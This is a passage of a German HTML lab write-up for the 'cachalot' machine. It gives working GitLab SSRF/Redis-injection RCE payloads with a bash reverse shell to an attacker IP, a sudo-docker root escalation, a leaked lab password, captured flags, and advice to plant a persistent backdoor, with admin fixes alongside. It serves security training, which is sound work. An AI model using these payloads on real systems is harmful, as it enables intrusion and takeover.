+                <br>**Empfehlung (Admin):** **Erster Zugriff als git-Benutzer:** Dies ist kritisch. Beheben Sie die GitLab RCE-Schwachstelle. Überprüfen Sie die Berechtigungen des `git`-Benutzers und schränken Sie diese auf das absolut notwendige Minimum ein.
+            </p>
+            <p>
+                Empfangen der Reverse Shell als Benutzer `git` auf meiner Maschine:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.217] 60406</span>
+<span class="password">id</span>
+<span class="command">uid=998(git) gid=998(git) groups=998(git)</span>
+
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">stty rows 47 columns 94</span>
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">ls -la</span>
+<span class="command">total 8</span>
+<span class="command">drwx------ 2 git root 4096 Oct  9  2022 .</span>
+<span class="command">drwxr-xr-x 9 git root 4096 Jun  8 12:10 ..</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept: Authenticated Remote Code Execution via GitLab Import (CVE-2018-19585/CVE-2018-19571)</h2>
+             <p class="comment">
+                Dieser Bereich demonstriert die Ausnutzung einer Authentifizierten Remote Code Execution (RCE) Schwachstelle in GitLab Version 11.4.7 über die Repository-Importfunktion. Durch die Injektion eines bösartigen Payloads in die Import-URL konnte Arbitrary Code als Benutzer `git` auf dem Zielsystem ausgeführt werden, was zum ersten Zugang führte.
+             </p>
+             <h3>Kurzbeschreibung</h3>
+             <p>
+                Die GitLab-Instanz auf Port 5080 läuft in einer verwundbaren Version (11.4.7). Die Repository-Importfunktion ist anfällig für Server-Side Request Forgery (SSRF) kombiniert mit Redis Command Injection. Ein Angreifer mit gültigen Anmeldedaten kann eine speziell gestaltete `git://` URL verwenden, um eine Verbindung zur internen Redis-Instanz herzustellen und Befehle in die GitLab Job-Warteschlange (`resque:gitlab:queue:system_hook_push`) einzuschleusen. Ein Worker-Prozess (GitlabShellWorker) führt diese Jobs asynchron aus, was die Ausführung beliebigen Codes ermöglicht.
+             </p>
+             <h3>Voraussetzungen</h3>
+             <ul>
+                 <li>Zugriff auf das Netzwerk, in dem sich das Zielsystem befindet (192.168.2.0/24).</li>
+                 <li>Gültige Anmeldedaten für einen Benutzer mit Berechtigung zur Projekterstellung in der GitLab-Instanz (im Test: Root-Benutzer mit Passwort `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`, erhalten via Grafana LFI).</li>
+                 <li>Fähigkeit, angepasste HTTP POST-Anfragen an den Zielwebserver auf Port 5080 zu senden (z.B. über einen Browser mit Entwickler-Tools oder einen Proxy wie Burp Suite).</li>
+                 <li>Kenntnis der Angreifer-IP-Adresse (hier 192.168.2.199) und eines offenen Ports für einen Listener (hier 9001).</li>
+                 <li>Ein Listener (z.B. Netcat) auf der Angreifer-Maschine, der auf die eingehende Verbindung wartet.</li>
+             </ul>
+             <h3>Schritt-für-Schritt-Anleitung</h3>
+             <p class="analysis">
+                **Schritt 1: Erlangung der GitLab-Anmeldedaten.**
+                Über eine separate Local File Inclusion (LFI) Schwachstelle im Grafana-Dienst auf Port 3000 konnte die Datei `/srv/initial_root_password` ausgelesen werden, die das Root-Passwort für GitLab enthielt. (Details siehe Web Enumeration).
+             </p>
+             <p class="analysis">
+                **Schritt 2: Authentifizierung bei GitLab.**
+                Melden Sie sich mit den kompromittierten Root-Anmeldedaten (`root`:`<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`) bei der GitLab-Instanz auf Port 5080 an.
+             </p>
+             <p class="analysis">
+                **Schritt 3: Vorbereitung des Payloads.**
+                Erstellen Sie einen bösartigen Payload, der die SSRF/Redis-Injection-Schwachstelle ausnutzt und einen Befehl zur Ausführung in die Job-Queue einschleust. Der Payload verwendet eine `git://` URL, die auf die interne Redis-Instanz (`127.0.0.1:6379`) zeigt, gefolgt von injizierten Redis-Befehlen (`multi`, `sadd`, `lpush`, `exec`). Der `lpush` Befehl enthält einen JSON-String für einen `GitlabShellWorker` Job, der die Ruby-Funktion `class_eval` aufruft, um einen Bash-Befehl über `open('|...').read` auszuführen. Der auszuführende Befehl ist eine Reverse Shell zu Ihrer Angreifer-Maschine (z.B. `bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'`). Der gesamte `git://` URL-String muss URL-codiert werden und die Anführungszeichen innerhalb des JSON-Strings korrekt maskiert werden. Es muss auch eine Umgehung der alphanumerischen Hostname-Validierung integriert werden (z.B. `git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/...`).
+             </p>
+             <pre>
+<span class="analysis">Beispiel für den Kern des angepassten Payloads (URL-dekodiert):</span>
+<span class="command">git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
+<span class="command">multi</span>
+<span class="command">sadd resque:gitlab:queues system_hook_push</span>
+<span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|bash -c \\\'bash -i &gt;&amp; /dev/tcp/192.168.2.199/9001 0&gt;&amp;1\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\"}"</span>
+<span class="command">exec</span>
+<span class="command">exec</span>
+</pre>
+
+             <p class="analysis">
+                **Schritt 4: Vorbereitung des Listeners.**
+                Auf der Angreifer-Maschine wird ein Netcat-Listener auf dem Port eingerichtet, der im Reverse Shell Payload angegeben ist (hier 9001).
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Schritt 5: Auslösen des Exploits über die GitLab Importfunktion.**
+                Navigieren Sie in GitLab als authentifizierter Root-Benutzer zur Funktion "New Project" -> "CI/CD project" -> "Import project" -> "Repo by URL". Fügen Sie den URL-codierten, bösartigen `git://` Payload in das Feld "Git repository URL" ein und erstellen Sie das Projekt. Alternativ fangen Sie den POST-Request mit Burp Suite ab und modifizieren den `project[import_url]` Parameter.
+             </p>
+
+             <h3>Erwartetes Ergebnis</h3>
+             <p>
+                Die GitLab UI sollte den Import initiieren ("Import in progress"). Asynchron wird ein Job in die Redis-Queue gestellt. Der `GitlabShellWorker` wird den Job abrufen, den Payload verarbeiten und die Reverse Shell ausführen. Der Netcat-Listener auf der Angreifer-Maschine sollte eine eingehende Verbindung vom Zielsystem auf Port 9001 registrieren und eine interaktive Shell, typischerweise als Benutzer `git`, bereitstellen.
+             </p>
+             <h3>Beweismittel</h3>
+             <p class="evaluation">
+                Der Output des Netcat-Listeners zeigt die eingehende Verbindung und den `git` Shell-Prompt, was den erfolgreichen ersten Zugang belegt.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.217] 60406</span>
+<span class="password">id</span>
+<span class="command">uid=998(git) gid=998(git) groups=998(git)</span>
+
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">stty rows 47 columns 94</span>
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">ls -la</span>
+<span class="command">total 8</span>
+<span class="command">drwx------ 2 git root 4096 Oct  9  2022 .</span>
+<span class="command">drwxr-xr-x 9 git root 4096 Jun  8 12:10 ..</span>
+</pre>
+                </div>
+            </div>
+
+            <h3>Risikobewertung</h3>
+            <p class="evaluation">
+                **Kritisch:** Diese Authentifizierte RCE-Schwachstelle erlaubt Angreifern mit gültigen GitLab-Anmeldedaten die Ausführung beliebigen Codes auf dem GitLab-Server, was zur Kompromittierung des Containers und des zugrunde liegenden Hosts führen kann (abhängig von der Container-Isolation). In Kombination mit dem kompromittierten Root-Passwort ermöglicht dies die vollständige Übernahme.
+            </p>
+            <h3>Empfehlungen</h3>
+            <ul>
+                <li>**Sofortige Aktualisierung:** Aktualisieren Sie die GitLab-Instanz umgehend auf eine nicht anfällige Version (>= 11.4.8 oder neuere Hauptversion).</li>
+                <li>**Passwort-Rotation:** Ändern Sie das Root-Passwort in GitLab sofort. Überprüfen Sie, ob das gefundene Passwort für andere Dienste oder Benutzer verwendet wird und ändern Sie diese ebenfalls.</li>
+                <li>**Sichere Konfiguration:** Stellen Sie sicher, dass interne Dienste (wie Redis) nicht über SSRF von externen Eingaben erreichbar sind.</li>
+                <li>**Zugriffskontrolle:** Beschränken Sie die Repository-Importfunktion auf vertrauenswürdige Benutzer, falls sie nicht deaktiviert werden kann.
+                <li>**Monitoring:** Überwachen Sie GitLab-Logs auf Anzeichen von Exploit-Versuchen oder ungewöhnlicher Job-Ausführung.
+            </ul>
+        </section>
+
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                **Analyse:** Nachdem ich eine interaktive Shell als Benutzer `git` erhalten habe, beginne ich mit der Suche nach Wegen zur Privilege Escalation (PE) auf den Root-Benutzer des Hosts. Ich überprüfe die `sudo` Berechtigungen des aktuellen Benutzers mit `sudo -l`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Kritische Schwachstelle!** Die Ausgabe von `sudo -l` zeigt, dass der Benutzer `git` den Befehl `/usr/bin/docker` als Root ausführen darf (`(root)`) und das Wichtigste: `NOPASSWD:`. Das bedeutet, ich kann den `docker` Befehl mit Root-Privilegien auf dem Host-System ausführen, ohne ein Passwort eingeben zu müssen. Dies ist ein direkter und mächtiger Vektor zur vollständigen Kompromittierung des Hosts.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie diese `sudo docker` Berechtigung umgehend, um Root-Zugriff auf das Host-Dateisystem zu erlangen.
+                <br>**Empfehlung (Admin):** **EXTREM DRINGEND:** Entfernen Sie diese `NOPASSWD` Regel für den Benutzer `git` in der `sudoers`-Datei. Unprivilegierten Benutzern sollte niemals erlaubt sein, den `docker` Befehl mit Root-Rechten auszuführen, da dies triviale Container-Escapes ermöglicht. Prüfen Sie die `sudoers` Datei auf weitere unsichere Einträge.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for git on gitlab.cachalot.local:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+
+<span class="password">User git may run the following commands on gitlab.cachalot.local:</span>
+    <span class="password">(root) NOPASSWD: /usr/bin/docker</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um meine Privilegien auf Root auf dem Host zu eskalieren, nutze ich die entdeckte `sudo docker` Berechtigung. Ich führe den Befehl `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh` aus. Dieser Befehl verwendet `sudo`, um `docker run` als Root auszuführen. `docker run` startet einen temporären Container vom Image `alpine`. Der Parameter `-v /:/mnt` mountet das Root-Dateisystem (`/`) des Host-Systems in das Verzeichnis `/mnt` im Container. `chroot /mnt sh` wird dann *im Container* ausgeführt und wechselt die Root-Verzeichnis in das gemountete Host-Dateisystem, wodurch ich effektiv eine Shell mit Root-Berechtigungen auf dem Host-Dateisystem erhalte. Ich bestätige meine Identität mit dem Befehl `id`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Der Root-Zugriff war erfolgreich, nun habe ich mein Ziel erreicht!** Der `id` Befehl in der neu erhaltenen Shell gibt `uid=0(root) gid=0(root) groups=0(root),...` zurück, was beweist, dass ich nun Root-Privilegien auf dem Host-System habe. Die unsichere `sudo docker` Konfiguration ermöglichte eine triviale Container-Escape-Methode.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Das `sudo docker` NOPASSWD Recht ist ein direkter Weg zu Root. Nutzen Sie die `docker run -v /:/mnt ...` Methode, um eine Root-Shell auf dem Host zu erlangen.
+                <br>**Empfehlung (Admin):** **SOFORT MAßNAHMEN ERGREIFEN:** Korrigieren Sie die `sudoers`-Datei, um dem Benutzer `git` (oder jedem anderen unprivilegierten Benutzer) die Ausführung von `docker` mit Root-Rechten zu verbieten. Implementieren Sie strenge Zugriffskontrollen für den `docker` Daemon und die `docker.sock` Datei. Stellen Sie sicher, dass Benutzer `git` die geringstmöglichen Rechte besitzt.
+            </p>
+            <p>
+                Ausnutzung der `sudo docker` Berechtigung zur Erlangung einer Root-Shell auf dem Host:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">git@gitlab:~/gitlab-rails/working$</span> <span class="command">sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+<span class="password">Unable to find image 'alpine:latest' locally</span>
+<span class="password">latest: Pulling from library/alpine</span>
+<span class="password">fe07684b16b8: Pull complete</span>
+<span class="password">Digest: sha256:8a1f59ffb675680d47db6337b49d22281a139e9d709335b492be023728e11715</span>
+<span class="password">Status: Downloaded newer image for alpine:latest</span>
+<span class="password"># id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span>
+<span class="password">#</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der Root-Shell auf dem Host-System suche ich nun nach den Flags. Ich navigiere in das Home-Verzeichnis des Root-Benutzers (`cd ~`) im Host-Dateisystem (das unter `/mnt` gemountet ist, wenn ich `chroot /mnt` bin), und suche nach der Root-Flag (typischerweise `root.txt` oder `proof.txt`). Ich finde `proof.txt` und lese dessen Inhalt. Ich liste auch das Home-Verzeichnis des Benutzers `cachalot` auf (`ls /home`) und lese den Inhalt seiner User-Flag (`local.txt`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Abschließender Erfolg!** Ich habe sowohl die Root-Flag (`proof.txt`) als auch die User-Flag (`local.txt` des Benutzers `cachalot`, der im `/home` Verzeichnis gefunden wurde) gefunden und ausgelesen. Dies dokumentiert die vollständige Kompromittierung der Maschine. Die Root-Flag befand sich direkt im Wurzelverzeichnis (`/`) des Host-Dateisystems, zugänglich nach dem `chroot /mnt`. Die User-Flag befand sich im Home-Verzeichnis des Standardbenutzers `cachalot`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sobald Root-Zugriff erlangt wurde, sichern Sie umgehend die Root-Flag. Suchen Sie auch nach der User-Flag, falls diese noch nicht gefunden wurde. Dokumentieren Sie die Pfade und Werte beider Flags. Etablieren Sie eine persistente Hintertür.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Root-Flags und User-Flags restriktive Berechtigungen haben und sich an sicheren Orten befinden. Überprüfen Sie das Dateisystem auf sensible Dateien, die ungeschützt liegen.
+            </p>
+            <p>
+                Sichern der Root- und User-Flags:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password"># cat proof.txt</span>
+<span class="password">02c157a9d76e85bfd03546fb74d0a384</span>
+
+<span class="password"># ls /home</span>
+<span class="command">cachalot</span>
+<span class="password"># cat /home/cachalot/local.txt</span>
+<span class="password">64675c29aaa3f6d9d9d7c68e53706aac5a</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/cachalot/local.txt</div>
+                    <div class="flag-value"><span class="password">64675c29aaa3f6d9d9d7c68e53706aac5a</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /proof.txt</div> <!-- Basierend auf der Ausgabe, proof.txt war direkt im Host-Root -->
+                    <div class="flag-value"><span class="password">02c157a9d76e85bfd03546fb74d0a384</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 06 Jun 2025</p> <!-- Datum aus dem Berichtstext extrahiert -->
+    </footer>
+ 
+
+</body>
+</html>
